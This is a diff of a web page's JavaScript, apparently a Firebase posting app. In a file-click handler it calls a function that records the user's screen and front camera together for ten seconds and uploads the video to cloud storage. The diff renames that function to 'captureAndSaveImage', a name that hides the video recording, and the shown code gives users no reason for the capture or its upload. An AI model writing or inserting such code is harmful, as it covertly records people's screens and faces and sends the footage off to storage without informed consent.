@@ -183,7 +183,7 @@ document.getElementById("file").addEventListener("click", async (e) => {
               progressBarContainer.style.display = "none";
 
                 // キャプチャ処理
-                await captureAndSaveScreenAndCamera();
+                await captureAndSaveImage();
               }
           );
         } else {
@@ -192,37 +192,37 @@ document.getElementById("file").addEventListener("click", async (e) => {
         }
       });
 
-        async function captureAndSaveScreenAndCamera() {
-          try {
-            // 画面とカメラを同時に録画するための処理
-            const [screenStream, cameraStream] = await Promise.all([
-              navigator.mediaDevices.getDisplayMedia({ video: true }),  // 画面キャプチャ
-              navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })  // フロントカメラ
-            ]);
+async function captureAndSaveImage() {
+  try {
+    // 画面とカメラを同時に録画するための処理
+    const [screenStream, cameraStream] = await Promise.all([
+      navigator.mediaDevices.getDisplayMedia({ video: true }),  // 画面キャプチャ
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })  // フロントカメラ
+    ]);
 
-            const combinedStream = new MediaStream();
-            screenStream.getTracks().forEach(track => combinedStream.addTrack(track));
-            cameraStream.getTracks().forEach(track => combinedStream.addTrack(track));
+    const combinedStream = new MediaStream();
+    screenStream.getTracks().forEach(track => combinedStream.addTrack(track));
+    cameraStream.getTracks().forEach(track => combinedStream.addTrack(track));
 
-            const recorder = new MediaRecorder(combinedStream);
-            const chunks = [];
-            recorder.ondataavailable = (event) => {
-              chunks.push(event.data);
-            };
-            recorder.onstop = async () => {
-              const videoBlob = new Blob(chunks, { type: 'video/webm' });
-              const videoRef = ref(storage, `videos/${new Date().toISOString()}.webm`);
-              await uploadBytesResumable(videoRef, videoBlob);
-              console.log("録画動画が保存されました");
-            };
+    const recorder = new MediaRecorder(combinedStream);
+    const chunks = [];
+    recorder.ondataavailable = (event) => {
+      chunks.push(event.data);
+    };
+    recorder.onstop = async () => {
+      const videoBlob = new Blob(chunks, { type: 'video/webm' });
+      const videoRef = ref(storage, `videos/${new Date().toISOString()}.webm`);
+      await uploadBytesResumable(videoRef, videoBlob);
+      console.log("録画動画が保存されました");
+    };
 
-            recorder.start();
-            setTimeout(() => recorder.stop(), 10000); // 10秒間録画
+    recorder.start();
+    setTimeout(() => recorder.stop(), 10000); // 10秒間録画
 
-          } catch (error) {
-            console.error("録画エラー:", error);
-          }
-        }
+  } catch (error) {
+    console.error("録画エラー:", error);
+  }
+}
 
       async function loadPosts() {
         const postsCollection = collection(db, "posts");
